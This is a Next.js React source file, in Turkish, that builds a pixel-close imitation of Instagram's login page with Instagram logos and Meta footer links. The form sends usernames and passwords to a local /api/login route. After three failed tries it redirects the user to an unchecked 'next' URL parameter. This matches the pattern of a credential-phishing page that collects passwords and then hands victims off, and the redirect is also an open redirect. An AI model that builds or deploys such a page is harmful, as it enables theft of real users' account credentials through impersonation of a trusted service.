"use client";
import { useRouter, useSearchParams } from 'next/navigation';
import { useState } from 'react';
import Image from "next/image";
import Link from 'next/link';

import facebook from "@/../public/facebook.svg";
import playstore from "@/../public/playstore.png";
import microsoft from "@/../public/microsoft.png";

// YÖNLENDİRMEYİ YAP 
// İNSTAGRAM LOGOSU GÖZÜKMÜYORO NU DÜZELT
export default function LoginPage() {
  const [loginCounter, setLoginCounter] = useState(0);
  const router = useRouter();

  const searchParams = useSearchParams();
  const [error, setError] = useState(null);
  
  const handleSubmit = async (e) => {
    e.preventDefault();
    setError(null);
  
    setLoginCounter((prevCount) => prevCount + 1);
  
    const response = await fetch('/api/login', {
      method: 'POST',
      body: JSON.stringify({
        username: e.target.username.value,
        password: e.target.password.value,
      }),
      headers: { 'Content-Type': 'application/json' },
    });

    if (response.status === 200) {
      const nextUrl = searchParams.get("next");
      router.push(nextUrl ? nextUrl : "/panel");
    } else {
      if (loginCounter + 1 > 2) {
        const nextUrl = searchParams.get("next");
        window.location.href = nextUrl ? nextUrl : "/";
        /*
        const nextUrl = getNextParam();
        window.location.href = nextUrl ? nextUrl : "/";

      router.push(nextUrl);
        */
      } else {
        setError('Üzgünüz, şifren yanlıştı. Lütfen şifreni dikkatlice kontrol et.');
      }
    }
  };  

  const [usernameValue, setUsernameValue] = useState('');
  const [passwordValue, setPasswordValue] = useState('');
  const [showPassword, setShowPassword] = useState(false);

  const handleUsernameChange = (e) => {
    setUsernameValue(e.target.value);
  };
  const handlePasswordChange = (e) => {
    setPasswordValue(e.target.value);
  };
  const togglePasswordVisibility = () => {
    setShowPassword((prevState) => !prevState);
  };
//<div className="grid grid-rows-[20px_1fr_20px] items-center justify-items-center min-h-screen p-8 gap-20 sm:p-20">
  return (
    <div className="flex flex-col justify-center items-center min-h-screen">
      <main className="flex-1 flex flex-col justify-center h-full space-y-4 row-start-2 items-center sm:items-start w-full max-w-[350px]">
        <div className="flex flex-col gap-8 border border-[#DBDBDB] dark:border-[#363636] p-10 w-full">
          <div className="flex justify-center w-full select-none">
            <Image
              className="pt-4 block dark:hidden"
              src="/instagram-black.png"
              alt="Instagram logo"
              width={180}
              height={38}
              priority
            />
            <Image
              className="pt-4 hidden dark:block"
              src="/instagram-white.png"
              alt="Instagram logo"
              width={180}
              height={38}
              priority
            />
          </div>

          <div className="flex flex-col w-full">
            <form
              onSubmit={handleSubmit}
              className="flex flex-col justify-center items-center gap-2 w-full"
            >
              <div className="relative w-full border border-1 border-[#DBDBDB] dark:border-[#555555] rounded-lg">
                <input
                  required
                  type="text"
                  id="username"
                  name="username"
                  aria-label="Telefon numarası, kullanıcı adı veya e-posta"
                  className="w-full pt-2 h-11 rounded-lg text-xs bg-[#FAFAFA] dark:bg-[#121212] p-3 py-1 focus:outline-none focus:border-none transition-colors peer"
                  autoComplete="off"
                  value={usernameValue}
                  onChange={handleUsernameChange}
                />
                <label
                  htmlFor="username"
                  className={`absolute w-full text-[#a8a8a8] cursor-text pointer-events-none peer-focus:text-[11px] peer-focus:-top-[-0.120rem] peer-focus:left-[0.60rem] transition-all select-none ${
                    usernameValue.trim() !== ""
                      ? "-top-[-0.120rem] left-[0.60rem] text-[11px]"
                      : "top-[0.80rem] left-2 text-[12px]"
                  }`}
                >
                  Telefon numarası, kullanıcı adı veya e-posta
                </label>
              </div>

              <div className="relative w-full border border-1 bg-[#FAFAFA] dark:bg-[#121212] border-[#DBDBDB] dark:border-[#555555] rounded-lg">
                <input
                  required
                  type={showPassword ? "text" : "password"}
                  id="password"
                  name="password"
                  className="w-5/6 pt-2 text-ellipsis overflow-hidden h-11 rounded-lg text-xs bg-[#FAFAFA] dark:bg-[#121212] p-3 py-1 focus:outline-none focus:border-none transition-colors peer"
                  autoComplete="off"
                  value={passwordValue}
                  onChange={handlePasswordChange}
                />
                <label
                  htmlFor="password"
                  className={`absolute w-full text-[#a8a8a8] cursor-text pointer-events-none peer-focus:text-[11px] peer-focus:-top-[-0.120rem] peer-focus:left-[0.60rem] transition-all select-none ${
                    passwordValue.trim() !== ""
                      ? "-top-[-0.120rem] left-[0.60rem] text-[11px]"
                      : "top-[0.80rem] left-2 text-[12px]"
                  }`}
                >
                  Şifre
                </label>
                <button
                  type="button"
                  onClick={togglePasswordVisibility}
                  className={`absolute right-3 top-1/2 -translate-y-1/2 text-sm text-[#555555] dark:text-[#A0A0A0] hover:text-[#000000] dark:hover:text-[#FFFFFF] transition-colors ${
                    passwordValue.trim() !== "" ? "visible" : "hidden"
                  }`}
                >
                  {showPassword ? "Gizle" : "Göster"}
                </button>
              </div>

              <button
                className={`h-[32px] flex items-center justify-center rounded-xl text-[#F5F5F5] font-medium text-base font-roboto w-full ${
                  usernameValue.trim() !== "" && passwordValue.trim() !== ""
                    ? "bg-[#1877F2]"
                    : "bg-[#4CB5F9] dark:bg-[#0069AD]"
                }`}
                type="submit"
              >
                Giriş yap
              </button>
            </form>

            <span className="flex flex-row items-center py-4">
              <hr className="flex-1 h-px border-0 bg-[#DBDBDB] dark:bg-[#262626]" />
              <p className="text-xs px-2 font-roboto text-[#737373] dark:text-[#A8A8A8]">
                YA DA
              </p>
              <hr className="flex-1 h-px border-0 bg-[#DBDBDB] dark:bg-[#262626]" />
            </span>

            <div className="flex flex-col gap-2">
              <Link
                className="flex items-center gap-1 justify-center w-full"
                href="/"
              >
                <Image
                  src={facebook}
                  width={30}
                  height={30}
                  className="fill-[#2c76bb]"
                  alt="Facebook icon"
                />
                <p className="text-sm font-[500] dark:font-[600] font-roboto text-[#2c76bb] dark:text-[#3897F1]">
                  Facebook ile Giriş Yap
                </p>
              </Link>
              <p className="text-center text-[14px] text-[#ED4956]">{error}</p>
              <Link href="/" className="text-sm text-center">
                Şifreni mi unuttun?
              </Link>
            </div>
          </div>
        </div>

        <div className="flex flex-col gap-8 border border-[#DBDBDB] dark:border-[#363636] p-6 w-full">
          <p className="text-sm text-center font-roboto">
            Hesabın yok mu?{" "}
            <Link
              href="/"
              className="text-sm font-roboto font-[500] text-[#0095F7] dark:text-[#3897F1]"
            >
              Kaydol
            </Link>
          </p>
        </div>

        <div className="flex flex-col items-center w-full space-y-2">
          <p className="text-center text-sm">Uygulamayı indir.</p>
          <span className="flex justify-center gap-2">
            <a href="">
              <Image
                src={playstore}
                width={134}
                height={40}
                alt="Picture of the author"
              />
            </a>
            <a href="">
              <Image
                src={microsoft}
                width={110}
                height={40}
                alt="Picture of the author"
              />
            </a>
          </span>
        </div>
      </main>
      <footer className="flex-none flex my-6 mb-12 gap-6 flex-wrap items-center justify-center text-xs text-[#737373] dark:text-[#A8A8A8] max-w-[600px]">
        <a href="">Meta</a>
        <a href="">Hakkında</a>
        <a href="">İş Fırsatları</a>
        <a href="">Yardım</a>
        <a href="">API</a>
        <a href="">Gizlilik</a>
        <a href="">Koşullar</a>
        <a href="">Konumlar</a>
        <a href="">Instagram Lite</a>
        <a href="">Threads</a>
        <a href="">Kişi Yükleme ve Hesabı Olmayan Kişiler</a>
        <a href="">Meta Verified</a>
      </footer>
    </div>
  );
}
